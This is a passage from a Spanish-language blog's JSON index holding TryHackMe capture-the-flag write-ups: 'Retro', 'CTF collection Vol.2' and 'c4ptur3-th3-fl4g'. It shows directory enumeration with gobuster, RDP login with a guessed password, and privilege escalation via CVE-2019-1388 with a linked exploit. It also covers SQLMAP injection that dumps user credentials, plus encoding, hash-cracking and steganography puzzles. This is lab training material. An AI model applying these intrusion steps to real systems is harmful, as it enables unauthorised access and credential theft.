|_ssl-date: 2020-02-13T22:50:58+00:00; -1s from scanner time. Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -1s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Feb 13 16:50:59 2020 -- 1 IP address (1 host up) scanned in 333.22 seconds   GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos que nos pudiesen servir.\n1 2  root@aoiri:~/tryhackme/retro# gobuster dir -u 10.10.69.12 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -q -t 105 -x php,asp,aspx,txt,html /retro (Status: 301)   /retro Dentro de la pagina encontramos un post el cual contiene un comentario del usuario wade.\nRDP - User Consideramos que \u0026lsquo;parzival\u0026rsquo; es una contraseña del usuario wade, utilizamos el servicio RDP de la maquina para utilizar esta informacion. Utilizamos vinagre para conectarnos a la maquina. Obtenemos nuestra flag user.txt.\nPRIVILEGE ESCALATION Enumeramos la maquina y vemos en el historial un CVE que el usuario estuvo buscando ademas de eso un archivo en la papelera de reciclaje. Investigamos que podria ser este archivo y encontramos que es utilizado para obtener privilegios de administracion en el CVE-2019-1388.\nCVE-2019-1388\nSeguimos los pasos que nos indican en github, en caso de que no podamos realizar los pasos podemos utilizar el siguiente exploit:\nhttps://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213\nBuild 14393:\nObtenemos nuestra shell como usuario administrator y nuestra flag root.txt.\n","description":"","id":51,"section":"posts","tags":["windows"],"title":"TryHackMe - Retro","uri":"https://sckull.github.io/posts/retro/"},{"content":"CTF Collection Vol.2 es una serie de retos de TryHackMe aqui encontrarás la solucion para obtener las flags.\n Informacion de la Maquina    Titulo CTF collection Vol.2     Info Sharpening up your CTF skill with the collection. The second volume is about web-based CTF.   Puntos 3492   Dificultad Media   Maker Deskel    GOBUSTER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  root@aoiri:~/tryhackme/ctfvolcollection2# gobuster dir -u http://10.10.51.83/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -q -t 35 -x php,html,txt /button (Status: 200) /cat (Status: 200) /cgi-bin/ (Status: 403) /cgi-bin/.html (Status: 403) /index.php (Status: 200) /index (Status: 200) /index.php (Status: 200) /iphone (Status: 200) /login (Status: 301) /robots (Status: 200) /robots.txt (Status: 200) /robots.txt (Status: 200) /server-status (Status: 403) /small (Status: 200) /static (Status: 200) root@aoiri:~/tryhackme/ctfvolcollection2#   Easter 1 La maquina esta diseñada para ser explotada via web para obtener las flags. Desde este punto de vista utilizamos gobuster para obtener los directorios, como siempre, revisamos el archivo robots.txt donde vemos una cadena en hexadecimal.\nUtilizamos CyberChef para obtener nuestra flag:\nEaster 2 Revisamos el archivo robots.txt nuevamente, donde vemos una URL codificada.\nUtilizamos CyberChef para poder decodificar la cadena y obtener nuestra flag.\n1  Base64 \u0026gt; URL decode \u0026gt; Base64 \u0026gt; \u0026#34;Remove spaces\u0026#34; \u0026gt; Base64 \u0026gt; \u0026#34;Remove spaces\u0026#34; \u0026gt; Base64   Visitamos la url que logramos decodificar, obtenemos nuestra flag.\nEaster 3 En el codigo fuente de /login encontramos nuestra flag.\nEaster 4 En la pagina /login encontramos un formulario, capturamos los datos del metodo POST y utilizamos SQLMAP para realizar una inyeccion SQL POST. Obtenemos la contraseña de DesKel y la crackeamos con md5hashing\n1 2 3 4 5 6 7 8  Database: THM_f0und_m3 Table: nothing_inside [1 entry] +-------------------------+ | Easter_4 | +-------------------------+ | THM{ ... snip ... } | +-------------------------+   Easter 5 De la misma forma obtenemos los datos de la base de datos.\n1 2 3 4 5 6 7 8 9  Database: THM_f0und_m3 Table: user [2 entries] +----------+------------------------------------+ | username | password | +----------+------------------------------------+ | DesKel | 05f3672ba[... snip ...]0070d1b | | Skidy | He is a nice guy, say hello for me | +----------+------------------------------------+   Easter 6 Vemos los headers de la pagina principal.\nEaster 7 Utilizamos el cookie Invited y con burpsuite le pasamos un numero, al ingresar el numero correcto obtenemos nuestra flag.\nEaster 8 Utilizamos los headers de Iphone.\nSolucion:\nEaster 9 Visitamos la pagina /ready y vemos el codigo fuente donde encontramos la flag.\nEaster 10 Debemos reclamar nuestro voucher.\nSolucion, referenciamos hacia tryhackme.com en los headers:\nEaster 11 En las opciones de la pagina principal vemos cuatro, pero vemos que \u0026ldquo;Deskel\u0026rdquo; prefiere huevo (egg). Enviamos egg en lugar de las opciones disponibles.\nSolucion:\nEaster 12 En el codigo javascript de la pagina encontramos una funcion, la ejecutamos para obtener nuestra flag.\nEaster 13 El reto 9 nos lleva al 13, la misma dinamica, el codigo fuente.\nEaster 14 En el codigo fuente de la pagina principal vemos un comentario que contiene una imagen codificada en base64. Renderizamos la imagen o descomentamos el comentario para obtener la flag.\nSolucion:\nEaster 15 En la pagina /game1 vemos un formulario con una pista. Utilizamos Burpsuite para insertar letras del abecedario, vemos el resultado de cada una de las letras que se muestran en \u0026ldquo;Your Hash\u0026rdquo; para poder comparar los datos (hash) con la pista (hash) que nos muestra en la pagina.\nSi ingresamos la letra \u0026ldquo;Z\u0026rdquo; y el resultado es \u0026ldquo;1000\u0026rdquo;, comparamos el resultado con la pista, si el resultado es igual que al de la pista tenemos nuestra primera letra \u0026ldquo;Z\u0026rdquo;. Repetimos hasta tener el resultado.\nResultado de 51 89 77 93 126 14 93 10.\nEaster 16 En la pagina /game2 debemos de presionar los tres botones al mismo tiempo, editamos el HTML para convertir los formularios en uno solo y damos click a un boton.\nSolucion:\nEaster 17 Encontramos un script en la pagina principal en binario.\nSolucion:\n1  Binary \u0026gt; Hex \u0026gt; Text   Binary \u0026gt; Hex\nHex \u0026gt; Text\nEaster 18 Enviamos en los headers egg: Yes.\nSolucion:\nEaster 19 Vemos una imagen.webp que no se muestra en la pagina.\nSolucion:\nEaster 20 En este reto nos muestran un usuario y contraseña las cuales debemos de enviar por el metodo POST, en la pagina principal.\nSolucion:\n","description":"","id":52,"section":"posts","tags":["challenge"],"title":"TryHackMe - CTF collection Vol.2","uri":"https://sckull.github.io/posts/ctf_collection_vol2/"},{"content":"C4ptur3-th3-fl4g es una serie de retos de TryHackMe aqui encontrarás la solucion para obtener las flags.\n Informacion de la Maquina    Titulo c4ptur3-th3-fl4g     Info A beginner level CTF challenge   Puntos 4565   Dificultad Facil   Maker dcdavidlee    Hashes Algunas paginas con las cuales podemos analizar el hash y resolver los retos en linea.\nHash Identification\nHash Analyzer\nCyberChef\nTranslation \u0026amp; Shifting  #1 L33t o adivinando el mensaje. Reto:\nc4n y0u c4p7u23 7h3 f149?\nSolucion:\ncan you capture the flag?\n#2 From Binary Reto:\n01101100 01100101 01110100 01110011 00100000 01110100 01110010 01111001 00100000 01110011 01101111 01101101 01100101 00100000 01100010 01101001 01101110 01100001 01110010 01111001 00100000 01101111 01110101 01110100 00100001 Solucion:\nhttps://gchq.github.io/CyberChef/#recipe=From_Binary('Space')\u0026amp;input=MDExMDExMDAgMDExMDAxMDEgMDExMTAxMDAgMDExMTAwMTEgMDAxMDAwMDAgMDExMTAxMDAgMDExMTAwMTAgMDExMTEwMDEgMDAxMDAwMDAgMDExMTAwMTEgMDExMDExMTEgMDExMDExMDEgMDExMDAxMDEgMDAxMDAwMDAgMDExMDAwMTAgMDExMDEwMDEgMDExMDExMTAgMDExMDAwMDEgMDExMTAwMTAgMDExMTEwMDEgMDAxMDAwMDAgMDExMDExMTEgMDExMTAxMDEgMDExMTAxMDAgMDAxMDAwMDE #3 Base32 Reto:\nMJQXGZJTGIQGS4ZAON2XAZLSEBRW63LNN5XCA2LOEBBVIRRHOM====== Solucion:\nhttps://gchq.github.io/CyberChef/#recipe=From_Base32('A-Z2-7%3D',false)\u0026amp;input=TUpRWEdaSlRHSVFHUzRaQU9OMlhBWkxTRUJSVzYzTE5ONVhDQTJMT0VCQlZJUlJIT009PT09PT0 #4 Base64 Reto:\nRWFjaCBCYXNlNjQgZGlnaXQgcmVwcmVzZW50cyBleGFjdGx5IDYgYml0cyBvZiBkYXRhLg== Solucion:\nhttps://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)\u0026amp;input=UldGamFDQkNZWE5sTmpRZ1pHbG5hWFFnY21Wd2NtVnpaVzUwY3lCbGVHRmpkR3g1SURZZ1ltbDBjeUJ2WmlCa1lYUmhMZz09 #5 Hex Reto:\n68 65 78 61 64 65 63 69 6d 61 6c 20 6f 72 20 62 61 73 65 31 36 3f Solucion:\nhttps://gchq.github.io/CyberChef/#recipe=From_Hex('Space')\u0026amp;input=NjggNjUgNzggNjEgNjQgNjUgNjMgNjkgNmQgNjEgNmMgMjAgNmYgNzIgMjAgNjIgNjEgNzMgNjUgMzEgMzYgM2Y #6 Caesar Cipher Reto:\nEbgngr zr 13 cynprf! Decoder - Caesar Cipher\n#7 Rot47 Reto:\n*@F DA:? \u0026gt;6 C:89E C@F?5 323J C:89E C@F?5 Wcf E:\u0026gt;6DX Solucion:\nhttps://gchq.github.io/CyberChef/#recipe=ROT47(47)\u0026amp;input=KkBGIERBOj8gPjYgQzo4OUUgQ0BGPzUgMzIzSiBDOjg5RSBDQEY/NSBXY2YgRTo%2BNkRY #8 Morse Code Reto:\n- . .-.. . -.-. --- -- -- ..- -. .. -.-. .- - .. --- -. . -. -.-. --- -.. .. -. --. Solucion:\nhttps://gchq.github.io/CyberChef/#recipe=From_Morse_Code('Space','Line%20feed')\u0026amp;input=LSAuIC4tLi4gLiAtLi0uIC0tLSAtLSAtLSAuLi0gLS4gLi4gLS4tLiAuLSAtIC4uIC0tLSAtLgoKLiAtLiAtLi0uIC0tLSAtLi4gLi4gLS4gLS0u #9 Decimal Reto:\n85 110 112 97 99 107 32 116 104 105 115 32 66 67 68 Solucion:\nhttps://gchq.github.io/CyberChef/#recipe=From_Decimal('Space',false)\u0026amp;input=ODUgMTEwIDExMiA5NyA5OSAxMDcgMzIgMTE2IDEwNCAxMDUgMTE1IDMyIDY2IDY3IDY4 #10 Base64 \u0026gt; Morse Code \u0026gt; Binary \u0026gt; Rot47 \u0026gt; Decimal Reto:\nLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0= Solucion:\nhttps://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)From_Morse_Code('Space','Line%20feed')From_Binary('Space')ROT47(47)From_Decimal('Space',false)\u0026amp;input= HASHES #1 MD2 Reto:\n39d4a2ba07e44421c9bedd54dc4e1182 Solucion:\nhttps://md5hashing.net/hash/md2/39d4a2ba07e44421c9bedd54dc4e1182 #2 MD4 Reto:\ne0418e7c6c2f630c71b2acabbcf8a2fb Solucion:\nhttps://md5hashing.net/hash/md4/e0418e7c6c2f630c71b2acabbcf8a2fb #3 MD5 Reto:\nefbd448a935421a54dda43da43a701e1 Solucion:\nhttps://md5hashing.net/hash/md5/efbd448a935421a54dda43da43a701e1 #4 NTLM Reto:\n11FE61CE0639AC2A1E815D62D7DEEC53 Solucion:\nMicrosoft has encryption? #5 SHA512 Reto:\na361f05487b879f25cc4d7d7fae3c7442e7849ed15c94010b389faafaf8763f0dd022e52364027283d55dcb10974b09e7937f901584c092da65a14d1aa8dc4d8 Solucion:\nhttps://md5hashing.net/hash/sha512/a361f05487b879f25cc4d7d7fae3c7442e7849ed15c94010b389faafaf8763f0dd022e52364027283d55dcb10974b09e7937f901584c092da65a14d1aa8dc4d8 #6 SHA256 Reto:\nd48a2f790f7294a4ecbac10b99a1a4271cdc67fff7246a314297f2bca2aaa71f Solucion:\nhttps://md5hashing.net/hash/sha256/d48a2f790f7294a4ecbac10b99a1a4271cdc67fff7246a314297f2bca2aaa71f #7 SHA1 Reto:\na34e50c78f67d3ec5d0479cde1406c6f82ff6cd0 Solucion:\nhttps://md5hashing.net/hash/sha1/a34e50c78f67d3ec5d0479cde1406c6f82ff6cd0 SPECTROGRAMS En este reto nos proporcionan un archivo wav, utilizamos Sonic Vizualiser y agregando una capa de Spectrograma logramos ver la flag.\nSTEGANOGRAPHY Utilizamos steghide para extraer los archivos contenidos dentro de la imagen.\n1 2 3 4 5 6 7 8  ➜ capture_the_flag steghide extract stegosteg.jpg steghide: unknown argument \u0026#34;stegosteg.jpg\u0026#34;. steghide: type \u0026#34;steghide --help\u0026#34; for help. ➜ capture_the_flag steghide extract -sf stegosteg.jpg Enter passphrase: wrote extracted data to \u0026#34;steganopayload2248.txt\u0026#34;. ➜ capture_the_flag cat steganopayload2248.txt Spa[... snip ...]teg%   SECURITY THROUGH OBSCURITY En este reto nos proporcionan una imagen en la que se aplica nuevamente esteganografia.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  ➜ capture_the_flag binwalk meme.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 30 0x1E TIFF image data, big-endian, offset of first image directory: 8 74407 0x122A7 RAR archive data, version 5.x 74478 0x122EE PNG image, 147 x 37, 8-bit/color RGBA, non-interlaced 74629 0x12385 Zlib compressed data, default compression ➜ capture_the_flag binwalk meme.jpg -e DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 30 0x1E TIFF image data, big-endian, offset of first image directory: 8 WARNING: Extractor.execute failed to run external extractor \u0026#39;unrar e \u0026#39;%e\u0026#39;\u0026#39;: [Errno 2] No such file or directory: \u0026#39;unrar\u0026#39;: \u0026#39;unrar\u0026#39;, \u0026#39;unrar e \u0026#39;%e\u0026#39;\u0026#39; might not be installed correctly WARNING: Extractor.execute failed to run external extractor \u0026#39;unrar -x \u0026#39;%e\u0026#39;\u0026#39;: [Errno 2] No such file or directory: \u0026#39;unrar\u0026#39;: \u0026#39;unrar\u0026#39;, \u0026#39;unrar -x \u0026#39;%e\u0026#39;\u0026#39; might not be installed correctly 74407 0x122A7 RAR archive data, version 5.x 74478 0x122EE PNG image, 147 x 37, 8-bit/color RGBA, non-interlaced 74629 0x12385 Zlib compressed data, default compression   Extraemos el archivo rar.\n1 2 3 4 5 6 7 8 9 10 11  ➜ _meme.jpg.extracted unrar e 122A7.rar UNRAR 5.50 freeware Copyright (c) 1993-2017 Alexander Roshal Extracting from 122A7.rar Extracting hackerchat.png OK All OK ➜ _meme.jpg.extracted ls 122A7.rar 12385 12385.zlib hackerchat.png   Utilizamos Strings para ver nuestra flag en la nueva imagen.\n1 2 3 4 5 6 7 8 9 10 11 12  ➜ _meme.jpg.extracted strings hackerchat.png| tail \u0026#39;[SQP S~j@6h vA}= *s\u0026amp;__ @9Xs {@84 2$Es i2Mc IEND \u0026#34;AHH_[... snip ...]_ME!\u0026#34; ➜ _meme.jpg.extracted   ","description":"","id":53,"section":"posts","tags":["challenge"],"title":"TryHackMe - c4ptur3-th3-fl4g","uri":"https://sckull.github.io/posts/c4ptur3-th3-fl4g/"},{"content":"CTF collection Vol.1 es una serie de retos de TryHackMe aqui 